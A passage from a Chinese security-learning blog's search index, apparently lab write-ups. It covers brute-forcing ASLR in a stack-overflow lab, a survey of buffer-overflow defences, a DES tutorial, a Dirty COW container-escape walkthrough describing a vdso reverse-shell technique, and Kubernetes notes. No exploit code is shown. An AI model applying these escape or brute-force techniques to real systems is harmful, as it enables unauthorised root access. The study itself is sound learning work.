title="五、拓展"></a>五、拓展</h2><p>开启地址空间随机化</p><p>栈的基址空间只有2^19次，这使得可以通过暴力破解的方式进行攻击，即使此时开启了地址空间布局随机化ASLR技术，也完全可以在一定时间内完成攻击。制作一个脚本script.sh，让它一直去执行stack程序，直到成功。</p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230322000127279.png" alt="script.sh"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash script.sh<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230322000151958.png" alt="暴力破解"></p><p>最终还是可以得到root权限</p><p><strong>现有的防御机制</strong></p><p><strong>a.</strong> <strong>阻止恶意代码的写入：对写入内容进行加密保护</strong>，由硬件对缓冲区中的内容进行自动的加密操作，待读取的时候，由硬件进行解密，即使恶意代码被写入，但是之后跳转到恶意代码后，这个恶意代码是密文的形式，无法执行。但是问题在于，加密算法可以被推测出来；而且由硬件进行加密、解密的操作，开销也是一个问题。</p><p><strong>b.</strong> <strong>对写入缓冲区的内容进行完整性校验</strong>，对缓冲区的内容起始做一个hash值进行保存，函数准备返回的时候，再次对缓冲区的内容做一次hash值，和之前的hash值进行比对，如果相同则正常返回，反之则拒绝跳转。但是实际上缓冲区的内容在实际运行过程中会发生变化，对于hash值的保存也是一个问题，hash值是否会被篡改。</p><p><strong>c. Canary机制</strong>，Canary机制的基本思想是在函数返回地址之前，将一个特殊的值存储在栈上，然后在函数返回时检查这个值是否被修改。如果被修改，说明发生了缓冲区溢出，程序会立即终止，并进行相应的安全处理。同样也存在着问题，对于Canary值我每次进行一个字节的覆盖去猜测，如果程序没有崩溃的话，说明这个字节猜对了，则进行下一字节的猜测，注意每个函数的Canary的值在每一次执行的时候是不一样的，但是对于同一个进程而言它的Canary值是一样的。</p><p><strong>d.</strong> <strong>影子栈</strong>，影子栈是开辟一块栈空间用于存储函数的返回地址，每次将要进行函数的返回的时候，我们进行两个返回地址的比较，如果相同则正常返回，如果不同则拒绝返回。但是问题在于影子栈也有可能会被覆盖，只需要找到一个函数栈帧在影子栈之下，利用这个函数栈帧的缓冲区溢出，对影子栈进行覆写。</p><p><strong>e.</strong> <strong>栈不可执行</strong>：栈不可执行演化出来的问题在于我可以使用return-to-libc攻击，这样的话，我不需要在栈上执行我的代码，只需要在共享库里面寻找所需要的gadget，构成一个gadget chain这样的话就可以就可以绕过栈不可执行而达到攻击的目的。</p><p><strong>f.</strong> <strong>地址空间随机化</strong>，这个防御手段在本次实验中已经试验过了，栈的基址只有219的可能，所以我们一直循环执行我们的攻击程序，总会有一次可以成功碰撞上，只不过需要花费的时间不同。</p><p><strong>g. CFI(控制流完整性)、CFB</strong>：基于硬件的保护机制，CFI机制可以有效地防止控制流劫持攻击，因为通过动态检查控制流，可以在运行时及时发现控制流劫持攻击，并阻止攻击者进一步执行恶意代码。在编译的时候，进行控制流的监控，终点关注jump等跳转指令，将合法的jump指令加入白名单，如果在实际运行的时候，在遇上跳转指令的时候，判断它是否在白名单里面，如果不在的话极有可能发生了缓冲区溢出的问题。</p><p><strong>h. ASan (Address Sanitizer)</strong> 谷歌推出的针对C/C++ 的快速内存错误检测工具</p><p><strong>i. HeapHopper</strong> 它是一种用于自动化堆漏洞挖掘的工具，使用模糊测试技术来构造大量的输入来检测可能存在的漏洞。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Des算法的原理与实现</title>
    <link href="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Des算法的原理与实现"><a href="#Des算法的原理与实现" class="headerlink" title="Des算法的原理与实现"></a>Des算法的原理与实现</h1><h2 id="一、Des简介"><a href="#一、Des简介" class="headerlink" title="一、Des简介"></a>一、Des简介</h2><p><strong>DES(Data Encryption Standard)</strong>是目前最为流行的加密算法之一。DES是<strong>对称</strong>的，也就是说它使用同一个密钥来加密和解密数据。他是一个分组加密算法，分组大小为<strong>64</strong>位，如果不是64位的倍数，可以按照某种具体的规则来填充位，例如：<strong>PKCS7</strong></p><p>Des算法主要分为两大部分：①子密钥生成 ②迭代加密</p><p>DES算法通过对明文进行一系列的排列和替换操作来将其加密。</p><p>过程的关键就是从给定的初始密钥中得到16个子密钥的函数。要加密一组明文，每个子密钥按照顺序（1-16）以一系列的位操作施加于数据上，每个子密钥一次，一共重复16次。每一次迭代称之为一轮。要对密文进行解密可以采用同样的步骤，只是子密钥是按照逆向的顺序（16-1）对密文进行处理。</p><h2 id="二、16个子密钥生成"><a href="#二、16个子密钥生成" class="headerlink" title="二、16个子密钥生成"></a>二、16个子密钥生成</h2><p>​    首先是子密钥生成，我们的初始密钥是64位，但是实际上因为奇偶校验位的存在，有效位只有56位。</p><p><strong>step 1：64位初始密钥—&gt;56位密钥</strong></p><p>我们先根据64位初始密钥，进行密钥转换得到56位的密钥，这里涉及到密钥转换表，如下：</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303202940680.png" alt="image-20230303202940680"></p><p>解释一下这个表的含义，比如<strong>Key_ip_table[0]为57</strong>，代表原来的<strong>64</strong>位初始密钥的第<strong>57</strong>位作为得到<strong>56</strong>位密钥的第<strong>1</strong>位，<strong>Key_ip_table[1]</strong>为<strong>49</strong>，同理原来的第<strong>49</strong>位初始密钥作为得到的<strong>56</strong>位密钥的第<strong>2</strong>位，最终可以得到<strong>56</strong>位的密钥。</p><p><strong>step2：56位密钥分成左右两组28bit，进行左循环移位</strong></p><p>​    这里涉及到循环移位多少次与是第几个密钥有关，同样涉及到一张表</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303203646030.png" alt="image-20230303203646030"></p><p>比如说第1轮，那就只需要左移1位，第二轮也只需要移动1位，而第3轮需要左移2位</p><p><strong>step 3：两组合并得到56位密钥，然后进行置换选择，得到48位的子密钥</strong></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303203909792.png" alt="image-20230303203909792"></p><p>这里表中的数字的含义与上面的一致，压缩置换完毕之后得到的就是这一轮的子密钥</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/1281268-20180720073949486-1474910065.png" alt="img"></p><p>子密钥的生成流程可以参照上图</p><h2 id="三、迭代加密"><a href="#三、迭代加密" class="headerlink" title="三、迭代加密"></a>三、迭代加密</h2><p>​    Des的另外一个主体部分就是迭代加密，这里我们以一轮加密为例进行说明，过程如下：</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/1281268-20180722085234376-365550304.png" alt="img"></p><p><strong>step 1：64位明文数据进行初始置换</strong></p><p>​    同样这里涉及到一个初始置换表，这里含义与上面一致，此处目的仅为打乱原数据。</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303204551919.png" alt="image-20230303204551919"></p><p><strong>step 2：分组进行扩展置换</strong></p><p>​    分成的两组，一组为32位明文，右边部分先进行扩展置换，32位明文转换为48位数据，这里涉及扩展置换表，含义与上面一致</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303204950580.png" alt="image-20230303204950580"></p><p>得到48位数据后，与该轮次得到的子密钥进行异或运算，结果仍然为48位</p><p><strong>step 3：S盒变换</strong></p><p>​    S盒变换将48位的数据转变为32位数据，有8个盒子，48位数据分成8组，每一组6位，6位输入得到4位输出，最终得到32位的输出数据，这里借助S盒表</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213033624.png" alt="image-20230303213033624"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213044004.png" alt="image-20230303213044004"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213054104.png" alt="image-20230303213054104"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213108035.png" alt="image-20230303213108035"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213121957.png" alt="image-20230303213121957"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213136961.png" alt="image-20230303213136961"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213146273.png" alt="image-20230303213146273"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213155541.png" alt="image-20230303213155541"></p><p>这里我们以S1盒为例进行变化过程的说明，如果这<strong>6</strong>位数据是<strong>010110</strong>，中间四位<strong>1011</strong>作为列数，首尾两位<strong>00</strong>作为行数，所以得到的应该是为<strong>0</strong>，列为<strong>11</strong>，找到S1中相应位置为<strong>12</strong>,<strong>12</strong>的二进制表示为<strong>1100</strong>，所以这四位就作为输出，最终得到32位的数据。</p><p><strong>step 4 ：P盒置换</strong></p><p>​    经过S盒变换得到的32位数据，我们再进行P盒置换得到32位数据，这里借助P盒置换表，含义与之前的置换表一致，这样得到仍然是32位数据，得到数据后与原先的左边分组L0（32bit）进行异或运算，作为下一轮的R1，原先的R0作为下一轮的L1</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213719095.png" alt="image-20230303213719095"></p><p>完成之后，<strong>将左右两个分组交换然后开始下一轮</strong>。</p><p><strong>在最后一轮中，不用交换左右分组。</strong></p><p><strong>step 5：末置换</strong></p><p>当全部的16轮操作都结束后，<strong>将最后的右分组R16和最后剩下的左分组L16连接起来，组成一个64位的分组R16L16</strong>。</p><p>最后一步是将<strong>R16L16</strong>进行置换。</p><p>这里同样需要借助到一张置换表，最终得到的就是64位密文数据。<img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303214328951.png" alt="image-20230303214328951"></p><p>图片部分来源于网络</p><p>该内容仅作为学习记录，不做技术指导。</p><p>Des算法的具体实现，可访问：<a href="https://github.com/Sugar-122/Des">Des算法实现</a>  仅做学习记录。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用dirtycow（CVE-2016-5195）漏洞实现docker escape</title>
    <link href="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/"/>
    <url>/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/</url>
    
    <content type="html"><![CDATA[<h3 id="利用dirtycow（CVE-2016-5195）漏洞实现docker-escape"><a href="#利用dirtycow（CVE-2016-5195）漏洞实现docker-escape" class="headerlink" title="利用dirtycow（CVE-2016-5195）漏洞实现docker escape"></a>利用dirtycow（CVE-2016-5195）漏洞实现docker escape</h3><h4 id="1-dirtycow简要介绍"><a href="#1-dirtycow简要介绍" class="headerlink" title="1.dirtycow简要介绍"></a>1.dirtycow简要介绍</h4><blockquote><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p></blockquote><h4 id="2-dirtycow具体机制"><a href="#2-dirtycow具体机制" class="headerlink" title="2.dirtycow具体机制"></a>2.dirtycow具体机制</h4><p>Cow机制：</p><blockquote><p>以只读模式打开文件A，返回文件表示符号fd，将文件映射到内存，标记为MAP_PRIVATE，MAP_PRIVATE是一个copy-on-write的映射方式。尽管它也是有backend的，但在写入数据时，他会在物理内存copy一份数据出来(以页为单位)，而且这些数据是不会被回写到文件的。我们想要对一个只有只读权限的文件进行写操作，会经历以下的流程。</p></blockquote><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144117608.png" alt="image-20230105144117608"></p><h5 id="2-1-第一次循环"><a href="#2-1-第一次循环" class="headerlink" title="2.1 第一次循环"></a>2.1 第一次循环</h5><p><strong>第一次循环</strong>：首先他会调用<strong>__get_user_pages( )</strong>函数，进入第一次循环：通过给定的虚拟地址<strong>address</strong>，去查询相应的页表和页表项<strong>follow_page( )</strong>，发现页表和页表项目均为空，说明还没有加载过该页<strong>handle_mm_fault( )</strong>，进入进程缺页处理<strong>handle_pte_fault( )</strong>，由于对应物理页没有在内存，并且<strong>pte</strong>为空，说明之前没有加载过该页，又因为这是一个基于文件的映射,所以接下来会调用<strong>do_fault( )</strong>函数，<strong>do_fault( )</strong>函数的具体响应方式如下。</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144452945.png" alt="image-20230105144452945"></p><p>显然这里我们是因为第二种情况造成的缺页异常，所以接下来会调用<strong>do_cow_fault( )</strong>将分配的新页与<strong>PTE</strong>建立映射，并且把内容读取到当前新分配的页内，也就是说当前的<strong>pte</strong>执行的是<strong>cowed page</strong>，此时<strong>cow page</strong>属于匿名页，并且<strong>present=1，dirty=1,read-only=1</strong>，还是不可写（应用程序动态分配的堆内存称为匿名页（<strong>Anonymous Page</strong>）。</p><h5 id="2-2-第二次循环"><a href="#2-2-第二次循环" class="headerlink" title="2.2 第二次循环"></a>2.2 第二次循环</h5><p><strong>第二次循环：</strong>第一次循环完毕之后，系统再次调用<strong>follow_page( )</strong>函数，再次请求物理页，这一次页表和页表项都不为空，但是由于我们想进行写访问，但是对于<strong>vma</strong>属性为<strong>read-only</strong>，请求页失败，进入循环进行缺页处理，<strong>handle_pte_fault( )：</strong>通过此函数执行写时复制，分配新的<strong>page</strong>，拷贝旧<strong>page</strong>到新<strong>page</strong>, 并修改相应的页表项为读写。在获取旧的<strong>page</strong>的时候判断是否是匿名页，如果是匿名页，判断是否只有一个进程在引用该页或，如果是，则直接<strong>reuse old page</strong>，并尝试设置<strong>old page</strong> 标记为可写，并返回<strong>VM_FAULT_WRITE</strong>。否则需要新分配一个页作为<strong>cowed page</strong>，并返回<strong>VM_FAULT_WRITE</strong>。在循环中，如果检测到返回值为<strong>VM_FAULT_WRITE</strong>，为去掉请求访问<strong>FOLL_WRITE</strong>标志。</p><h5 id="2-3-第三次循环"><a href="#2-3-第三次循环" class="headerlink" title="2.3 第三次循环"></a>2.3 第三次循环</h5><p><strong>第三次循环：</strong>第二次循环完毕之后，再次调用<strong>follow_page( )</strong>函数，再次请求物理页，第二次请求的时候返回<strong>VM_FAULT_WRITE</strong>，去掉了<strong>FOLL_WRITE</strong>标记，这个时候<strong>PTE</strong>存在，权限也满足，故可以进行写的操作，此时的页是拷贝的副本。</p><h4 id="3-漏洞存在"><a href="#3-漏洞存在" class="headerlink" title="3. 漏洞存在"></a>3. 漏洞存在</h4><p>正常的Cow机制看似没有问题，但是由于竞态条件的存在，上面的操作不是原子的，尝试假设下面的一个情形：如果我们在第二次循环完毕之后，如果立刻使用<strong>madvise</strong>这个系统调用，释放掉刚刚分配好的拷贝页，释放掉内存是会清空页表和页表项的！！！则在第三次循环的时候，本该进行正常访问的时候，由于拷贝页已经被我们释放掉，所以说它会再进行一次页的分配，但是这个时候由于第二次循环，<strong>FOLL_WRITE</strong>标志已经被清除了，所以这个时候会被认为是读访问，所以此时分配的将会是原始页。所以这个漏洞的存在就使得我们可以对只读文件进行一个写的操作。</p><h4 id="4-逃逸思路：vdso-dirty-cow"><a href="#4-逃逸思路：vdso-dirty-cow" class="headerlink" title="4. 逃逸思路：vdso+dirty-cow"></a>4. 逃逸思路：<strong>vdso+dirty-cow</strong></h4><p><strong>dirty cow</strong>漏洞可以让我们获取只读内存的写的权限，我们首先利用<strong>dirty cow</strong>漏洞写入一段<strong>shellcode</strong>到<strong>VDSO</strong>映射的一段闲置内存中，然后改变函数的执行顺序，使得调用正常的任意函数之前都要执行这段<strong>shellcode</strong>。这段<strong>shellcode</strong>初始化的时候会检查是否是被<strong>root</strong>调用，如果是则继续执行，如果不是，则接着执行<strong>clock_gettime</strong>函数，接下来它会检测<strong>/tmp/.X</strong>文件的存在，如果存在，则这时已经是<strong>root</strong>权限了，然后它会打开一个反向的<strong>TCP</strong>链接，为<strong>Shellcode</strong>中填写的<strong>IP</strong>返回一个<strong>Shell</strong>。</p><h4 id="5-实验结果"><a href="#5-实验结果" class="headerlink" title="5. 实验结果"></a>5. 实验结果</h4><p>内核版本：<strong>3.13.0-85-generic</strong></p><p>Docker版本：<strong>17.03.0-ce</strong></p><p>Docker镜像：<strong>ppabc/cve-2016-5195</strong></p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144527454.png" alt="image-20230105144527454"></p><p>​                                                                                                          内核版本</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144542830.png" alt="image-20230105144542830"></p><p>​                                                                                                          docker版本</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144559014.png" alt="image-20230105144559014"></p><p>​                                                                                                            docker镜像</p><p>进入docker    </p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144614964.png" alt="image-20230105144614964"></p><p>编译攻击程序0xdeadbeef</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144628454.png" alt="image-20230105144628454"></p><p>运行0xdeadbeef</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144638823.png" alt="image-20230105144638823"></p><p>此时已经获取了宿主机的root权限的shell，逃逸完毕</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144654254.png" alt="image-20230105144654254"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes简要学习</title>
    <link href="/2023/03/03/Kubernetes%E5%AD%A6%E4%B9%A0%E6%90%AC%E8%BF%90/"/>
    <url>/2023/03/03/Kubernetes%E5%AD%A6%E4%B9%A0%E6%90%AC%E8%BF%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Kubernetes介绍"><a href="#Kubernetes介绍" class="headerlink" title="Kubernetes介绍"></a>Kubernetes介绍</h1><h2 id="1-Kubernetes-可以为你做些什么"><a href="#1-Kubernetes-可以为你做些什么" class="headerlink" title="1. Kubernetes 可以为你做些什么?"></a>1. Kubernetes 可以为你做些什么?</h2><p>通过现代的 Web 服务，用户希望应用程序能够 24/7 全天候使用，开发人员希望每天可以多次发布部署新版本的应用程序。 容器化可以帮助软件包达成这些目标，使应用程序能够以简单快速的方式发布和更新，而无需停机。Kubernetes 帮助你确保这些容器化的应用程序在你想要的时间和地点运行，并帮助应用程序找到它们需要的资源和工具。Kubernetes 是一个可用于生产的开源平台，根据 Google 容器集群方面积累的经验，以及来自社区的最佳实践而设计。</p><h2 id="2-Kubernetes-基础模块"><a href="#2-Kubernetes-基础模块" class="headerlink" title="2. Kubernetes 基础模块"></a>2. Kubernetes 基础模块</h2><blockquote><p>1.创建一个Kubernetes集群</p><p>2.部署应用程序</p><p>3.应用程序探索</p><p>4.应用外部可见</p><p>5.应用可拓展</p><p>6.应用更新</p></blockquote><h3 id="2-1-创建一个Kubernetes集群"><a href="#2-1-创建一个Kubernetes集群" class="headerlink" title="2.1 创建一个Kubernetes集群"></a>2.1 创建一个Kubernetes集群</h3><p>使用Minikube创建集群</p><p>Kubernetes 集群</p><p><strong>Kubernetes 协调一个高可用计算机集群，每个计算机作为独立单元互相连接工作。</strong> Kubernetes 中的抽象允许你将容器化的应用部署到集群，而无需将它们绑定到某个特定的独立计算机。为了使用这种新的部署模型，应用需要以将应用与单个主机分离的方式打包：它们需要被容器化。与过去的那种应用直接以包的方式深度与主机集成的部署模型相比，容器化应用更灵活、更可用。 <strong>Kubernetes 以更高效的方式跨集群自动分发和调度应用容器。</strong> Kubernetes 是一个开源平台，并且可应用于生产环境。</p><p>一个 Kubernetes 集群包含两种类型的资源: </p><p><strong>Master</strong>：调度整个集群</p><p><strong>Nodes</strong>：负责运行应用</p><p>集群图</p><p><img src="/2023/03/03/Kubernetes%E5%AD%A6%E4%B9%A0%E6%90%AC%E8%BF%90/image-20230112135905265.png" alt="image-20230112135905265"></p><p><strong>Master 负责管理整个集群。</strong> Master 协调集群中的所有活动，例如调度应用、维护应用的所需状态、应用扩容以及推出新的更新。</p><p><strong>Node 是一个虚拟机或者物理机，它在 Kubernetes 集群中充当工作机器的角色</strong> 每个Node都有 Kubelet , 它管理 Node 而且是 Node 与 Master 通信的代理。 Node 还应该具有用于处理容器操作的工具，例如 Docker 或 rkt 。处理生产级流量的 Kubernetes 集群至少应具有三个 Node，因为如果一个 Node 出现故障其对应的 etcd 成员和控制平面实例都会丢失，并且冗余会受到影响。 你可以通过添加更多控制平面节点来降低这种风险 。</p><p>在 Kubernetes 上部署应用时，你告诉 Master 启动应用容器。 Master 就编排容器在集群的 Node 上运行。 <strong>Node 使用 Master 暴露的 Kubernetes API 与 Master 通信。</strong>终端用户也可以使用 Kubernetes API 与集群交互。</p><p>Kubernetes 既可以部署在物理机上也可以部署在虚拟机上。你可以使用 Minikube 开始部署 Kubernetes 集群。 Minikube 是一种轻量级的 Kubernetes 实现，可在本地计算机上创建 VM 并部署仅包含一个节点的简单集群。 Minikube 可用于 Linux ， macOS 和 Windows 系统。Minikube CLI 提供了用于引导集群工作的多种操作，包括启动、停止、查看状态和删除。</p><h3 id="2-2-Kubernetes部署"><a href="#2-2-Kubernetes部署" class="headerlink" title="2.2 Kubernetes部署"></a>2.2 Kubernetes部署</h3><p>一旦运行了 Kubernetes 集群，就可以在其上部署容器化应用程序。 为此，你需要创建 Kubernetes <strong>Deployment</strong> 配置。Deployment 指挥 Kubernetes 如何创建和更新应用程序的实例。创建 Deployment 后，Kubernetes master 将应用程序实例调度到集群中的各个节点上。</p><p>创建应用程序实例后，Kubernetes Deployment 控制器会持续监视这些实例。 如果托管实例的节点关闭或被删除，则 Deployment 控制器会将该实例替换为集群中另一个节点上的实例。 <strong>这提供了一种自我修复机制来解决机器故障维护问题。</strong></p><p>在没有 Kubernetes 这种编排系统之前，安装脚本通常用于启动应用程序，但它们不允许从机器故障中恢复。通过创建应用程序实例并使它们在节点之间运行， Kubernetes Deployments 提供了一种与众不同的应用程序管理方法。</p><p>以上均是资源搬运，便于笔者记录</p><p>原网址：<a href="https://kubernetes.io/zh-cn/docs/home/">Kubernetes 文档 | Kubernetes</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
